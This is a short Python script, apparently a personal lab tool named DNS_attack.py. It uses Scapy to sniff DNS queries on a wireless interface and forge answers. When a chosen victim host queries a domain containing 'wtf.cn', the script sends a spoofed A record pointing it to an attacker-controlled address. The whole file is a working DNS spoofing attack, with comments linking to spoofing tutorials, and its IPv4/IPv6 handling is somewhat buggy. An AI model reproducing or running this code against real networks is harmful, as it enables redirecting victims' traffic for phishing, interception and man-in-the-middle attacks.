#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : DNS_attack.py
# @Author: Feng
# @Date  : 2020/11/18
# @Desc  : trace

from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.dns import DNS, DNSRR

from scapy.all import sendp, sniff


import sys


# python脚本实现~DNS欺骗攻击  https://zhuanlan.zhihu.com/p/363781136

# Python 实现ARP与DNS欺骗 https://blog.csdn.net/lyshark_csdn/article/details/124939960

# dns包 = IP()/UDP()/DNS(id,qr,opcode,rd，qd=DNSQR(qnname=dns_name), verbose=False) id标识 匹配请求与回应 qr 0表示查询报文 opcode 0表示标准查询 rd 1表示递归

def DNS_Spoof(data):

    ip_4_or_6 = False # True if IPv4(IP), False if IPv6
    ip_src = None
    try:
        ip_src = data[IP].src
    except:
        ip_4_or_6 = False

    try:
        ip_src = data[IPv6].src
    except:
        ip_4_or_6 = True

    if ip_4_or_6:
        print('-' * 60)
        print('ip_4_or_6: {}, ip_src={}'.format("IPv4" if ip_4_or_6 else "IPv6", ip_src))
        req_domain = data[DNS].qd.qname
        print('req_domain======', req_domain)
        print('-' * 60, end='\n\n')

    try:
        # ip_fields = data.getlayer(IP).fields
        # udp_fields = data.getlayer(UDP).fields
        # dns_fields = data.getlayer(DNS).fields

        #print(ip_fields)
        #print(udp_fields)
        # print(dns_fields)

        # print('ip.src======', str(data[IP].src))
        # print(str(data[IP].src) == '192.168.68.163')
        # print(str(req_domain) == 'www.baidu.com')
        if ip_4_or_6==True and str(data[IP].src) == '192.168.68.163':
            if str(req_domain).split("'")[1].find('wtf.cn') != -1:
                print('-------> ',str(req_domain))
                del (data[UDP].len)
                del (data[UDP].chksum)
                del (data[IP].len)
                del (data[IP].chksum)
                res = data.copy()
                res.FCfield = 2
                res.src, res.dst = data.dst, data.src
                res[IP].src, res[IP].dst = data[IP].dst, data[IP].src
                res.sport, res.dport = data.dport, data.sport
                res[DNS].qr = 1
                res[DNS].ra = 1
                res[DNS].ancount = 1
                res[DNS].an = DNSRR(
                    rrname = req_domain,
                    type = 'A',
                    rclass = 'IN',
                    ttl = 3600,
                    rdata = '192.168.68.158'
                )
                sendp(res)
        else:
            print('不是目标主机')
    except Exception as e:
        print(e)
        print(type(e))
        print('data-------------->',data, end='\n\n')


def DNS_S(iface):
    sniff(prn=DNS_Spoof, filter='udp dst port 53', iface=iface)


if __name__ == '__main__':
    DNS_S('WLAN')